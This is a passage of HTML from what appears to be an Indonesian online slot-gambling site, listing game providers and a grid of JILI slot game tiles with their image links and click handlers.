                                                               <img alt="" src="/assets/game_logos/100x70/ttg_slot8510.png" data-src="/assets/game_logos/100x70/ttg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BOOMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="fachai" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/fachai_slot8510.png" data-src="/assets/game_logos/100x70/fachai_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">FACHAI</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="jdb" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/jdb_slot8510.png" data-src="/assets/game_logos/100x70/jdb_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JDB</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="dragoonsoft" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/dragoon_slot8510.png" data-src="/assets/game_logos/100x70/dragoon_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">DRAGOON SOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="apollo777" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/apollo777_slot8510.png" data-src="/assets/game_logos/100x70/apollo777_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">APOLLO777</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="5gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/5gaming_slot8510.png" data-src="/assets/game_logos/100x70/5gaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">5GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="ygg" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/yggslot8510.png" data-src="/assets/game_logos/100x70/yggslot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">YGG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="kagaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/kagaming_slot8510.png" data-src="/assets/game_logos/100x70/kagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">KA GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="nagagames" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/nagagames_slot8510.png" data-src="/assets/game_logos/100x70/nagagames_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NAGA GAMES</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="live22" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/live22_slot8510.png" data-src="/assets/game_logos/100x70/live22_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">LIVE22</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="onegame" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/onegame_slot8510.png" data-src="/assets/game_logos/100x70/onegame_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">One Game</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="bgaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/bgaming_slot8510.png" data-src="/assets/game_logos/100x70/bgaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BGAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="gmw" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/gmw_slot8510.png" data-src="/assets/game_logos/100x70/gmw_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">GMW</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="uu" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/uu_slot8510.png" data-src="/assets/game_logos/100x70/uu_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">UU Slot</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="i8" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/i8_slot8510.png" data-src="/assets/game_logos/100x70/i8_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">i8</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="pegasus" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/pegasus_slot8510.png" data-src="/assets/game_logos/100x70/pegasus_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PEGASUS</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="btg" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/btg_slot8510.png" data-src="/assets/game_logos/100x70/btg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BTG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="kingmidas" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/kingmaker_slot8510.png" data-src="/assets/game_logos/100x70/kingmaker_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">KINGMIDAS</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="smartsoft" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/smartsoft_slot8510.png" data-src="/assets/game_logos/100x70/smartsoft_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SMARTSOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="toptrend-gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/ttg_slot8510.png" data-src="/assets/game_logos/100x70/ttg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">TOPTREND GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="liteplay" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/liteplay_slot8510.png" data-src="/assets/game_logos/100x70/liteplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">LITEPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                        <div class="btn-box  maintenance-alert bg-um " style="position:relative;overflow: hidden;">
                                                                 <img alt="" src="/assets/game_logos/100x70/mancalagaming_slot8510.png" data-src="/assets/game_logos/100x70/mancalagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title"> MANCALA GAMING</h5>
                </div>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                        <div class="btn-box  maintenance-alert bg-um " style="position:relative;overflow: hidden;">
                                                                 <img alt="" src="/assets/game_logos/100x70/eagaming_slot8510.png" data-src="/assets/game_logos/100x70/eagaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title"> EA GAMING</h5>
                </div>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="evoplay" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/evoplay_slot8510.png" data-src="/assets/game_logos/100x70/evoplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">EVOPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="sbo" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/sbo_slot8510.png" data-src="/assets/game_logos/100x70/sbo_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SBO</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="568win" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/sbo_568win_slot8510.png" data-src="/assets/game_logos/100x70/sbo_568win_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">568 WIN</h5>
              </a>
                           </div>

          
      </div>
    </div>
    <div class="right"><button class="next-btn btn" id="right-button"><i class="icon-keyboard_arrow_right"></i></button></div>


  </div>
</div>


         <div class="row no-gutters filter">
    <div class="col-xs-10 text-center">
      <div class="row">
        <div class="col-xs-3">
          <button class="btn btn-clear f" data-filter="NEW" [ngclass]="{ 'active': filterProperty==FilterType.New  }">BARU</button>
        </div>
        <div class="col-xs-3">
          <button class="btn btn-clear f" data-filter="TOP" [ngclass]="{ 'active': filterProperty==FilterType.Top  }">TOP</button>
        </div>
        <div class="col-xs-3">
          <button class="btn btn-clear f active" data-filter="ALL" [ngclass]="{ 'active': filterProperty==FilterType.All  }">SEMUA </button>
        </div>
      </div>
    </div>
    <div class="col-xs-1 text-right">
      <button class="btn btn-clear" id="btnFilters_003" data-filter="" data-trigger="nifty" data-target="#searchModal"><i class="icon-magnifier"></i></button>
    </div>
    <div class="col-xs-1 text-right">
      <button class="btn btn-clear" id="btnFilters_003" data-filter="" data-trigger="nifty" data-target="#filterModal-2"><i class="icon-equalizer2"></i></button>
    </div>
  </div>
  <div class="mobile-border"></div>
  <div class="mobile-border"></div>
  <br>
  <input type="hidden" value="jili_slot" name="hiddenGameID-001" id="hiddenGameID-001">
  <div class="row games no-gutters">
          
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="SUPER MAHJONG DELUXE" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'SUPER MAHJONG DELUXE', '/assets/games/i/165x220/jili/0f24ad48867a50ce331205dc4d1d9d30.webp?v=0.4' , '625', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games_logos/i/165x220/jili/0f24ad48867a50ce331205dc4d1d9d30.webp?v=0.4" src="/assets/games/i/165x220/jili/0f24ad48867a50ce331205dc4d1d9d30.webp?v=0.4" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="SUPER MAHJONG DELUXE">SUPER MAHJONG DELUXE</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Storm of Seth 2" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Storm of Seth 2', '/assets/games/i/165x220/jili/379692fd1765a40dc4d47dea0877d5f9.webp?v=0.1' , '705', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/379692fd1765a40dc4d47dea0877d5f9.webp?v=0.1" src="/assets/games/i/165x220/jili/379692fd1765a40dc4d47dea0877d5f9.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Storm of Seth 2">Storm of Seth 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Aztec Priestess" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Aztec Priestess', '/assets/games/i/165x220/jili/decd332a5d54252e732378675e4af1b1.webp?v=0.1' , '209', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/decd332a5d54252e732378675e4af1b1.webp?v=0.1" src="/assets/games/i/165x220/jili/decd332a5d54252e732378675e4af1b1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Aztec Priestess">Aztec Priestess</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Ace" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Ace', '/assets/games/i/165x220/jili/ee608645063c497253a2e25d3b44be85.webp?v=0.2' , '181', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/ee608645063c497253a2e25d3b44be85.webp?v=0.2" src="/assets/games/i/165x220/jili/ee608645063c497253a2e25d3b44be85.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Ace">Wild Ace</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Boxing King" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Boxing King', '/assets/games/i/165x220/jili/a309f20bb8ed1a70ae20699ea051ff35.webp?v=0.2' , '77', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/a309f20bb8ed1a70ae20699ea051ff35.webp?v=0.2" src="/assets/games/i/165x220/jili/a309f20bb8ed1a70ae20699ea051ff35.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Boxing King">Boxing King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Crazy777" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Crazy777', '/assets/games/i/165x220/jili/a4c5f68d531b9b955351e3d698c535a7.webp?v=0.2' , '35', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/a4c5f68d531b9b955351e3d698c535a7.webp?v=0.2" src="/assets/games/i/165x220/jili/a4c5f68d531b9b955351e3d698c535a7.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Crazy777">Crazy777</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mega Ace" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mega Ace', '/assets/games/i/165x220/jili/1bdc08c3d8ebcc75fde911da1ff558b5.webp?v=0.2' , '134', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/1bdc08c3d8ebcc75fde911da1ff558b5.webp?v=0.2" src="/assets/games/i/165x220/jili/1bdc08c3d8ebcc75fde911da1ff558b5.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mega Ace">Mega Ace</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Gems 3" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Gems 3', '/assets/games/i/165x220/jili/7b5878805f84c15743803aa9b79af6d6.webp?v=0.1' , '300', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/7b5878805f84c15743803aa9b79af6d6.webp?v=0.1" src="/assets/games/i/165x220/jili/7b5878805f84c15743803aa9b79af6d6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Gems 3">Fortune Gems 3</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Devil Fire 2" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Devil Fire 2', '/assets/games/i/165x220/jili/cbea7eb7b82175a12713e4543eafa997.webp?v=0.1' , '258', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/cbea7eb7b82175a12713e4543eafa997.webp?v=0.1" src="/assets/games/i/165x220/jili/cbea7eb7b82175a12713e4543eafa997.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Devil Fire 2">Devil Fire 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ali Baba" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ali Baba', '/assets/games/i/165x220/jili/8cddaa11ebe81eb5e7f9f343cc4f6252.webp?v=0.2' , '110', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/8cddaa11ebe81eb5e7f9f343cc4f6252.webp?v=0.2" src="/assets/games/i/165x220/jili/8cddaa11ebe81eb5e7f9f343cc4f6252.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ali Baba">Ali Baba</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Super Ace" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Super Ace', '/assets/games/i/165x220/jili/c6986969b56780ad55779d5b09f26d61.webp?v=0.2' , '49', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/jili/c6986969b56780ad55779d5b09f26d61.webp?v=0.2" src="/assets/games/i/165x220/jili/c6986969b56780ad55779d5b09f26d61.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Super Ace">Super Ace</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Charge Buffalo" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Charge Buffalo', '/assets/games/i/165x220/jili/4cc922820a84326bba3c7704a37b0be5.webp?v=0.2' , '47', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/jili/4cc922820a84326bba3c7704a37b0be5.webp?v=0.2" src="/assets/games/i/165x220/jili/4cc922820a84326bba3c7704a37b0be5.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Charge Buffalo">Charge Buffalo</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jackpot Joker" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jackpot Joker', '/assets/games/i/165x220/jili/5c5a320a60a5fea3170162851c92123f.webp?v=0.1' , '301', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/5c5a320a60a5fea3170162851c92123f.webp?v=0.1" src="/assets/games/i/165x220/jili/5c5a320a60a5fea3170162851c92123f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jackpot Joker">Jackpot Joker</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="JILI CAISHEN" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'JILI CAISHEN', '/assets/games/i/165x220/jili/780458837339dae622c89ee37de67fa7.webp?v=0.2' , '144', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/780458837339dae622c89ee37de67fa7.webp?v=0.2" src="/assets/games/i/165x220/jili/780458837339dae622c89ee37de67fa7.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="JILI CAISHEN">JILI CAISHEN</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Trial of Phoenix" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Trial of Phoenix', '/assets/games/i/165x220/jili/fb3efb252a96167bd6885a892bccb0f4.webp?v=0.2' , '208', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/fb3efb252a96167bd6885a892bccb0f4.webp?v=0.2" src="/assets/games/i/165x220/jili/fb3efb252a96167bd6885a892bccb0f4.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Trial of Phoenix">Trial of Phoenix</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gold Rush" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gold Rush', '/assets/games/i/165x220/jili/c415d7c8c4affb088067315afcac60bb.webp?v=0.2' , '137', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/c415d7c8c4affb088067315afcac60bb.webp?v=0.2" src="/assets/games/i/165x220/jili/c415d7c8c4affb088067315afcac60bb.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gold Rush">Gold Rush</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Devil Fire" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Devil Fire', '/assets/games/i/165x220/jili/af568db0c354cd55aaa23147afc26bce.webp?v=0.1' , '193', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/af568db0c354cd55aaa23147afc26bce.webp?v=0.1" src="/assets/games/i/165x220/jili/af568db0c354cd55aaa23147afc26bce.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Devil Fire">Devil Fire</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Charge Buffalo Ascent" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Charge Buffalo Ascent', '/assets/games/i/165x220/jili/9ad3aa3a01742c21aebbd27bcf0d1f68.webp?v=0.2' , '259', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/9ad3aa3a01742c21aebbd27bcf0d1f68.webp?v=0.2" src="/assets/games/i/165x220/jili/9ad3aa3a01742c21aebbd27bcf0d1f68.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Charge Buffalo Ascent">Charge Buffalo Ascent</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Crazy Golden Bank" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Crazy Golden Bank', '/assets/games/i/165x220/jili/5f4517f7f7eb4a5664195eee3e64c3d7.webp?v=0.2' , '45', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/5f4517f7f7eb4a5664195eee3e64c3d7.webp?v=0.2" src="/assets/games/i/165x220/jili/5f4517f7f7eb4a5664195eee3e64c3d7.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Crazy Golden Bank">Crazy Golden Bank</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Potion Wizard" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Potion Wizard', '/assets/games/i/165x220/jili/29f5cf46d1e3180a97091738a97ee4d9.webp?v=0.1' , '299', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/29f5cf46d1e3180a97091738a97ee4d9.webp?v=0.1" src="/assets/games/i/165x220/jili/29f5cf46d1e3180a97091738a97ee4d9.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Potion Wizard">Potion Wizard</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Goldbricks" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Goldbricks', '/assets/games/i/165x220/jili/9c624c19dc002875327be7b512f603da.webp?v=0.2' , '48', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/9c624c19dc002875327be7b512f603da.webp?v=0.2" src="/assets/games/i/165x220/jili/9c624c19dc002875327be7b512f603da.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Goldbricks">Lucky Goldbricks</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bonus Hunter" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bonus Hunter', '/assets/games/i/165x220/jili/32da9fcaab63fc84c76467f70c97c34d.webp?v=0.2' , '142', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/32da9fcaab63fc84c76467f70c97c34d.webp?v=0.2" src="/assets/games/i/165x220/jili/32da9fcaab63fc84c76467f70c97c34d.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bonus Hunter">Bonus Hunter</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pharaoh Treasure" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pharaoh Treasure', '/assets/games/i/165x220/jili/a2d822446aa6befb8cf89e4069b53a8c.webp?v=0.2' , '85', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/a2d822446aa6befb8cf89e4069b53a8c.webp?v=0.2" src="/assets/games/i/165x220/jili/a2d822446aa6befb8cf89e4069b53a8c.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pharaoh Treasure">Pharaoh Treasure</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mayan Empire" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mayan Empire', '/assets/games/i/165x220/jili/567161e4c1d7b1e23dc924605aee118f.webp?v=0.2' , '135', '152' )" style="">

          <div class="content-wrapper">
              
